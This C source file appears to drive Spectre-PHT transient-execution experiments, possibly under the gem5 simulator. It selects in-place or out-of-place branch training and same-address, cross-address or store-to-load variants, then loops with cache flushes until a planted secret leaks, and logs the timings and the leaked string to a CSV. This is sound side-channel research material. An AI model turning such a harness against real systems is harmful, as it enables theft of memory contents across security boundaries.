//#include "util.h"
#include "pht.h"

unsigned char data[128];
volatile int true = 1;
char *mem;
jmp_buf trycatch_buf;
size_t CACHE_MISS = 106;
size_t pagesize = 4096;

int main(int argc, const char **argv) {
    #ifdef linux
        // encourage core affinities
        #ifndef GEM5_COMPAT
            printf("pinning to core 0\n");
        #endif
        cpu_set_t cpu_pool;
        CPU_SET(0,&cpu_pool); // only need to care about parent, child inherits parent's
        int res = sched_setaffinity(0,1,&cpu_pool);
        #ifndef GEM5_COMPAT
            printf("result %d \n", res);
        #endif

    #endif

    
    uint64_t total_start;
    uint64_t total_end;


    struct memSetup m;

    setup(&m);


    struct runData r;
    r.ops = 0;
    r.start = 0;
    r.end = 0;
    memset(r.op_times,0,MAX_DATA);


    int j = 0;
    int tmp = 0;
    int tmp2 = 2;

    #ifndef GEM5_COMPAT
        printf("enter options\n");
        scanf("%d",&tmp);
        scanf("%d",&tmp2);
    #endif

    pid_t pid = 0;
    char* test_name;
    char* train_method;
    void (*trainer)();
    void (*executor)(void(), runData*, memSetup*, int*, pid_t);

    if (tmp == 0){
        trainer = train_ip;
        train_method = "ip";
    } else{
        trainer = train_oop;
        train_method = "oop";
    }

    if (tmp2 == 0){
        executor = sa;
        test_name = "sa";
    } else if (tmp2 == 1){
        executor = ca;
        test_name = "ca";
    } else{
        executor = stl;
        test_name = "stl";
        train_method = "";
    }
    #ifndef GEM5_COMPAT
        printf("test: spectre-%s-%s \n\n",test_name,train_method);
    #endif
    if (tmp2 == 1){
        pid = fork();
    }
    #ifndef GEM5_COMPAT
        nice(-30);
    #endif
    int size_bound = (tmp2 < 2) ? sizeof(DATA_SECRET)-1 : sizeof(SECRET) -1;
    
    #if USE_RDTSC_BEGIN_END
      total_start = rdtsc_begin();
      #else
      total_start = rdtsc();
    #endif
    
    while(r.ops < MAX_DATA) {
        // for every byte in the string
        j = (j + 1) % size_bound;
        #ifndef GEM5_COMPAT
            printf("\033[F(process info) ");
            printf("pgid: %5d, pid: %5d \r\n",__getpgid(pid),pid);
        #endif
        flush_shared_memory();
        executor(trainer,&r,&m,&j,pid);
        if(!strncmp(m.leaked + sizeof(DATA) - 1, SECRET, sizeof(SECRET) - 1)) break;
    }
    #if USE_RDTSC_BEGIN_END
      total_end = rdtsc_begin();
      #else
      total_end = rdtsc();
    #endif

    if (pid != 0){
        kill(pid,SIGTERM);
    }
    #ifndef GEM5_COMPAT
        printf("\n\x1b[1A[ ]\n\n[\x1b[32m>\x1b[0m] Done, %u cycles\n", (total_end - total_start));
        sleep(1);
    #endif

    FILE *fptr;
    fptr = fopen("ca_ip.csv","w");
    
    analyseOpData(&r,fptr);
    fprintf(fptr,"\n%s", m.leaked);
    free(m._mem);
/* 

    int exact = 0;
    int offset = (tmp2 == 2) ? 0 : sizeof(DATA) -1;
    for (int i = 0; i < sizeof(SECRET); i++){
        if (m.leaked[i + offset] == SECRET[i]){
            exact++;
        }
    }
    printf("accuracy: %f \n",(float)(exact) / (sizeof(SECRET) - 1)); */
    fclose(fptr);
}
